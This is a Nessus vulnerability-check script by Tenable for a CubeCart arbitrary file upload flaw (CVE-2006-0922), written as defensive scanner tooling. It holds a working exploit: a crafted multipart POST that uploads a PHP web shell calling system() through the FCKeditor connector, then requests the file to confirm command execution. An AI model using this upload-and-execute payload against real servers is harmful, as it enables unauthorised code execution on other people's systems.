#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that allows execution
of arbitrary PHP code. 

Description :

The version of CubeCart installed on the remote host allows an
unauthenticated user to upload files with arbitrary PHP code and then
to execute them subject to the privileges of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/425931
http://www.cubecart.com/site/forums/index.php?showtopic=17335
http://www.cubecart.com/site/forums/index.php?showtopic=17338

Solution :

Either apply the patch referenced in the first vendor advisory above
or upgrade to CubeCart version 3.0.10 or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description)
{
  script_id(21187);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2006-0922");
  script_bugtraq_id(16796);

  script_name(english:"CubeCart FCKeditor Arbitrary File Upload Vulnerability");
  script_summary(english:"Tries to use CubeCart to upload a file with PHP code");
 
  script_description(english:desc);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cubecart"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(
    dir, "/admin/includes/rte/editor/filemanager/browser/default/connectors/php/connector.php?",
    "Command=FileUpload&",
    "Type=File&",
    "CurrentFolder=/../uploads/"
  );

  # Make sure the affected script exists.
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it is...
  if ("OnUploadCompleted" >< res) {
    # Try to upload a file that will execute a command.
    cmd = "id";
    fname = string(SCRIPT_NAME, "-", unixtime(), ".php3");

    boundary = "nessus";
    req = string(
      "POST ",  url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: Mozilla/4.75 [en] (X11, U; Nessus)\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="NewFile"; filename="', fname, '"', "\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      '<? if ($REMOTE_ADDR == "', this_host(), '") { system(', cmd, "); } ?>\r\n",
  
      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # Now try to execute the command.
    http_check_remote_code(
      unique_dir    : dir,
      check_request : string("/images/uploads/", fname),
      check_result  : "uid=[0-9]+.*gid=[0-9]+.*",
      command       : cmd,
      description   : desc
    );
  }
}
